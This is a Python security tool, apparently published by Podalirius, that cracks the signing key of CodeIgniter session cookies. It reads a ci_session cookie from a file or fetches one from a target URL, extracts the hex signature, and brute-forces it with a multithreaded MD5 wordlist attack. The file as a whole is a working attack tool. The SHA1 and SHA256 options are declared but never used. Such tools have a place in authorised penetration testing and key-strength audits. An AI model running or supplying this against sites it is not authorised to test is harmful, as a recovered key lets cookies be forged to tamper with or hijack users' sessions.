#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : CodeIgniter-session-unsign.py
# Author             : Podalirius (@podalirius_)
# Date created       : 25 Jun 2022

import argparse
import binascii
import datetime
import hashlib
import os
import time
import urllib.parse
import requests
import sys
from concurrent.futures import ThreadPoolExecutor


def parseArgs():
    print("CodeIgniter-session-unsign v1.1 - by Remi GASCOU (Podalirius)\n")

    parser = argparse.ArgumentParser(description="Description message")
    group_source = parser.add_mutually_exclusive_group()
    group_source.add_argument("-u", "--url", default=None, help='URL of the CodeIgniter website.')
    group_source.add_argument("-c", "--cookie", default=None, help='CodeIgniter session cookie.')

    parser.add_argument("-w", "--wordlist", default=None, required=True, help='Wordlist of keys to test.')
    parser.add_argument("-t", "--threads", dest="threads", action="store", type=int, default=8, required=False, help="Number of threads (default: 8)")
    parser.add_argument("-k", "--insecure", dest="insecure", action="store_true", default=False, help="Allow insecure server connections when using SSL (default: False)")

    group = parser.add_mutually_exclusive_group()
    group.add_argument("--md5", default=False, help='Use MD5 algorithm.')
    group.add_argument("--sha1", default=False, help='Use SHA1 algorithm.')
    group.add_argument("--sha256", default=False, help='Use SHA256 algorithm.')

    return parser.parse_args()


def worker(ci_cookie_value, hash, password, monitor_data):
    if not monitor_data["found"]:
        try:
            monitor_data["tries"] += 1
            testhash = hashlib.md5(bytes(ci_cookie_value + password, 'UTF-8')).hexdigest()
            # print(testhash, hash, (hash == testhash))
            if hash == testhash:
                monitor_data["found"] = True
                monitor_data["candidate"] = password
                return True
            else:
                return False
        except Exception as e:
            print(e)


def monitor_thread(monitor_data):
    last_check, monitoring = 0, True
    while monitoring and not monitor_data["found"]:
        new_check = monitor_data["tries"]
        rate = (new_check - last_check)
        print("\r[%s] Status (%d/%d) %5.2f %% | Rate %d H/s        " % (
            datetime.datetime.now().strftime("%Y/%m/%d %Hh%Mm%Ss"),
            new_check, monitor_data["total"], (new_check/monitor_data["total"])*100,
            rate
        ), end="")
        last_check = new_check
        time.sleep(1)
        if rate == 0 and new_check != 0:
            monitoring = False

    if monitor_data["found"]:
        print("\n[>] Found password '%s'" % monitor_data["candidate"])
    else:
        print("")


def test_keys(ci_cookie_value, hash, wordlist_file, threads=8):
    f = open(wordlist_file, "r")
    wordlist = [l.strip() for l in f.readlines()]
    f.close()

    monitor_data = {"found": False, "tries": 0, "candidate": "", "total": len(wordlist)}

    # Waits for all the threads to be completed
    with ThreadPoolExecutor(max_workers=min(threads, len(wordlist))) as tp:
        tp.submit(monitor_thread, monitor_data)
        for password in wordlist:
            tp.submit(worker, ci_cookie_value, hash, password, monitor_data)
    if not monitor_data["found"]:
        print("[!] Hash could not be cracked from this wordlist.")


if __name__ == '__main__':
    options = parseArgs()

    if options.insecure:
        # Disable warings of insecure connection for invalid certificates
        requests.packages.urllib3.disable_warnings()
        # Allow use of deprecated and weak cipher methods
        requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
        try:
            requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
        except AttributeError:
            pass

    if not os.path.exists(options.wordlist):
        print("[!] Could not read wordlist %s." % options.wordlist)
        sys.exit()

    cookies = []
    if options.cookie is not None:
        if os.path.exists(options.cookie):
            f = open(options.cookie, "r")
            cookies = f.readlines()
            f.close()
    else:
        session = requests.Session()
        session.get(options.url, verify=(not options.insecure))
        for cookie in session.cookies:
            if cookie.name == "ci_session":
                cookies.append(cookie.value)

    for cookie_value in cookies:
        v = urllib.parse.unquote(cookie_value)
        if '}' in v:
            hashlen = len(v.split('}')[-1])
            hexhash = cookie_value[-hashlen:]
            hashraw = binascii.unhexlify(cookie_value[-hashlen:])
            ci_cookie_value = urllib.parse.unquote(cookie_value[:-hashlen])
            print("[+] Parsed CodeIgniter session cookie:")
            print("  | value: %s" % ci_cookie_value)
            print("  | signature (%d bits): %s" % (hashlen*8, hexhash))

            print("[+] Trying to find key...")
            test_keys(
                ci_cookie_value=ci_cookie_value,
                hash=hexhash,
                wordlist_file=options.wordlist,
                threads=options.threads
            )
        else:
            print("[!] Could not parse CodeIgniter session cookie.")
